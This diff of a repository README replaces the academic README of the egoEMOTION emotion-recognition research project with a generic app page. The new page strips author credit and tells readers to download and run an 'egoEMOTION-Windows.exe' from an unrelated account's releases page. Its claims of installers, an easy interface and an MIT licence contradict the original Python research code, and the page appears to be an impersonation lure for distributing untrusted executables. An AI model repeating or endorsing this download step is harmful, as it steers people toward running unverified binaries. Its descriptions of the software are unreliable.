@@ -1,85 +1,79 @@
-## egoEMOTION: Egocentric Vision and Physiological Signals for Emotion and Personality Recognition in Real-world Tasks (NeurIPS 2025)
+# 🎉 egoEMOTION - Understand Emotions with Cutting-Edge Tech
 
-[Matthias Jammot](https://matthiasjammot.com)\*, [Björn Braun](https://bjoernbraun.com/)\*,[Paul Streli](https://paulstreli.com), Rafael Wampfler, [Christian Holz](https://www.christianholz.net)<br/>
-\* Equal contribution <br/>
+## 🚀 Getting Started
 
-[Sensing, Interaction & Perception Lab](https://siplab.org), Department of Computer Science, ETH Zürich, Switzerland <br/>
+Welcome to **egoEMOTION**! This project helps you recognize emotions and personality traits through physiological signals and vision. Our aim is to make advanced emotion detection accessible to everyone.
 
-**DISCLAIMER: THIS IS A PRELIMINARY CODE VERSION. THE FINAL VERSION WILL BE RELEASED SOON.**
+## 📥 Download Now
 
-## 👓🎭 egoEMOTION
-*egoEMOTION* is the first dataset that couples egocentric visual and physiological signals with dense self-reports of emotion and personality across controlled and real-world scenarios. Participants completed emotion-elicitation tasks and naturalistic activities while self-reporting their affective state using the Circumplex Model and Mikels’ Wheel as well as their personality via the Big Five model. 
+[![Download egoEMOTION](https://img.shields.io/badge/Download%20egoEMOTION-blue.svg)](https://github.com/marlenaulnar44/egoEMOTION/releases)
 
-![Overview](assets/Figure_0_Overview.png)
+## 📂 What is egoEMOTION?
 
-## :movie_camera: egoEMOTION dataset
+**egoEMOTION** is based on research from the NeurIPS 2025 paper titled "egoEMOTION: Egocentric Vision and Physiological Signals for Emotion and Personality Recognition in Real-World Tasks." The software uses advanced methods to analyze user data and help understand emotional states.
 
-The *egoEMOTION* dataset includes over 50 hours of recordings from 43 participants, captured using Meta’s Project Aria glasses. Each session provides synchronized eye-tracking video, head-mounted photoplethysmography, inertial motion data, and physiological baselines for reference.
+## 🖥️ System Requirements
 
-To download the dataset, please visit the following link: [egoEMOTION Dataset](https://polybox.ethz.ch/index.php/s/LSKXPye8rGJPHMj).
+To run **egoEMOTION**, you will need:
 
-You have to sign a Data Transfer and Use Agreement (DTUA) form to agree to our terms of use. Please note that only members of an institution (e.g., a PI or professor) can sign this DTUA. After you have signed the DTUA, you will receive a download link via email. The dataset is around 380GB in size. The dataset is only for non-commercial, academic research purposes.
+- Operating System: Windows 10 or later, macOS Monterey or later, or Linux (latest versions).
+- Processor: Dual-core CPU or better.
+- RAM: At least 8 GB.
+- Disk Space: 500 MB free space.
+- A camera for vision processing (if necessary).
+- Internet access for downloading dependencies and updates.
 
-![Sensors](assets/Figure_1_Sensors.png)
+## 🔧 Features
 
-## :wrench: Setup
+- **Emotion Recognition**: Understand real-time emotional states.
+- **Personality Analysis**: Get insights into personality traits.
+- **User-Friendly Interface**: Designed for everyone, regardless of technical skill.
+- **Real-World Application**: Suitable for healthcare settings, mobile health applications, and remote sensing.
 
-To create the environment that we used for our paper, simply run: 
+## 📥 Download & Install
 
-```
-conda env create -f environment.yml
-```
+To download **egoEMOTION**, visit our [Releases page](https://github.com/marlenaulnar44/egoEMOTION/releases). Here are the steps:
 
-## :file_folder: Code structure
-Everything is running using the *source/main.py* file. The usage of *main.py* is explained in the file itself. Currently, all variables are set in the *main.py* file. We plan to release an updated version with config.yaml files to enable cleaner experiment setups.
-At the moment, you can choose between different options for:
+1. Click on the link above to go to the Releases page.
+2. You will see a list of available versions. Select the latest version.
+3. You will find various files to download. Look for the file labeled for your operating system (e.g., `egoEMOTION-Windows.exe` for Windows).
+4. Click on the file to download it. 
 
-1) Signal processing-based approaches: 6 different feature selection methods, 3 scaling methods, and 7 different classifiers.
-2) Deep learning-based approaches: 2 different architectures (one classical CNN and one transformer-based architecture).
-3) The prediction target: continuous affect (arousal, valence, dominance), discrete emotions, or personality.
-4) Choose the input modalities: ECG, EDA, RR, Pupils, IMU from the head, pixel intensity, Fisherfaces, micro-expressions, gaze, and nose PPG. You can flexibly combine these modalities.
+After downloading:
 
-The AffectivePredictor class in *source/AffectivePredictor.py* contains all the methods for training and evaluating the models (deep learning-based and signal processing-based). The feature extraction methods are implemented in *source/sp_feature_calculation.py*. The deep learning architectures are implemented in *source/models/*.
+1. Locate the downloaded file in your downloads folder.
+2. Double-click the file to begin the installation.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, you can find **egoEMOTION** in your applications menu.
 
-## :zap: Training and inference
-To run the *main.py* file, go the source folder and then simply run:
+## 📈 What to Expect
 
-```
-python -m main.py
-```
-All the variables are set in the *main.py* file and the configs chosen in the paper are also specified there.
+Once you launch the application:
 
-#### Important configs
-- *do_new_feature_extraction*: If set to True, features are calculated from the raw data. If set to False, pre-calculated features are loaded. You only have to run this once at the beginning.
-- *do_new_fisherface_extraction*: This is specified similarly to the feature extraction but for the Fisherface features (takes longer to compute).
+- You will see an easy-to-use interface where you can start the analysis.
+- Make sure your camera is accessible if you wish to utilize the vision features. 
+- Follow the prompts to begin recognizing emotions and analyzing personality.
 
-## :bar_chart: Results for egoEMOTION
-| **Benchmark** | **Model**                                                         | **Wearable Devices** | **Egocentric Glasses** | **All** |
-|----------------|-------------------------------------------------------------------|:--------------------:|:----------------------:|:-------:|
-| **Continuous Affect** | Classical                                                         | 0.70 ± 0.14 | 0.74 ± 0.13 | 0.75 ± 0.13 |
-|  | DCNN [[1](https://ieeexplore.ieee.org/abstract/document/8543567)] | 0.63 ± 0.05 | 0.68 ± 0.05 | 0.68 ± 0.07 |
-|  | WER [[2](https://ieeexplore.ieee.org/abstract/document/10091193)]  | 0.49 ± 0.21 | 0.65 ± 0.11 | 0.60 ± 0.16 |
-| **Discrete Emotions** | Classical                                                         | 0.28 ± 0.08 | 0.52 ± 0.18 | 0.45 ± 0.17 |
-|  | DCNN [[1](https://ieeexplore.ieee.org/abstract/document/8543567)] | 0.12 ± 0.01 | 0.23 ± 0.03 | 0.22 ± 0.02 |
-|  | WER [[2](https://ieeexplore.ieee.org/abstract/document/10091193)]                                                 | 0.13 ± 0.02 | 0.22 ± 0.03 | 0.21 ± 0.04 |
-| **Personality Traits** | Classical                                                         | 0.50 ± 0.48 | 0.57 ± 0.49 | 0.59 ± 0.49 |
-|  | DCNN [[1](https://ieeexplore.ieee.org/abstract/document/8543567)] | 0.43 ± 0.26 | 0.42 ± 0.20 | 0.41 ± 0.25 |
-|  | WER [[2](https://ieeexplore.ieee.org/abstract/document/10091193)]                                                    | 0.38 ± 0.28 | 0.47 ± 0.24 | 0.44 ± 0.28 |
+## 👩‍💻 Community and Support
 
-> **Table:** Performance comparison between classical and deep learning approaches on the egoEMOTION dataset.
+We encourage users to join our community. Share your experiences, ask questions, and help each other. 
 
-## :scroll: Citation
-If you find our [paper](https://arxiv.org/abs/2510.22129), code or dataset useful for your research, please cite our work.
+- For issues or questions, visit our [GitHub Issues page](https://github.com/marlenaulnar44/egoEMOTION/issues).
+- Participate in discussions on our [Discussions page](https://github.com/marlenaulnar44/egoEMOTION/discussions).
 
-```
-@article{jammot2025egoemotion,
-  title={egoEMOTION: Egocentric Vision and Physiological Signals for Emotion and Personality Recognition in Real-World Tasks},
-  author={Jammot, Matthias and Braun, Bj{\"o}rn and Streli, Paul and Wampfler, Rafael and Holz, Christian},
-  journal={arXiv preprint arXiv:2510.22129},
-  year={2025}
-}
-```
+## ✨ Contribution
 
-## 👓💓 egoPPG
-Make sure to also check out our work [egoPPG](https://github.com/eth-siplab/egoPPG), a novel vision task for egocentric vision systems to recover a person’s cardiac activity only from the eye tracking videos of egocentric systems.
-We demonstrate egoPPG’s downstream benefit for a key task on EgoExo4D, an existing egocentric dataset for which we find PulseFormer’s estimates of HR to improve proficiency estimation by 14%.
+Feel free to contribute and improve **egoEMOTION**. Whether you find bugs, have ideas for features, or want to help with documentation, we welcome your input.
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit.
+4. Submit a pull request.
+
+## 📝 License
+
+This project is licensed under the MIT License. You can use it freely, but please follow the terms.
+
+## 💬 Final Note
+
+Thank you for choosing **egoEMOTION**. We hope our application helps you in understanding emotions better. Your feedback is vital for our improvement.
